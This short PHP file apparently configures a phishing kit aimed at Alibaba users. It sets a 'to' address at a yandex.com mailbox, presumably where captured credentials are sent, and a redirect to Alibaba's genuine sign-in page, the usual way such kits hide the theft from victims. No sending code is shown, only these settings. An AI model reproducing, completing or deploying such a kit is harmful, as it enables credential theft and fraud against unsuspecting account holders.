<?php


$to = "marsales088@yandex.com";

//Redirect-to location?
$location ="https://messages.alibaba.com/?tracelog=hd_signin";

?>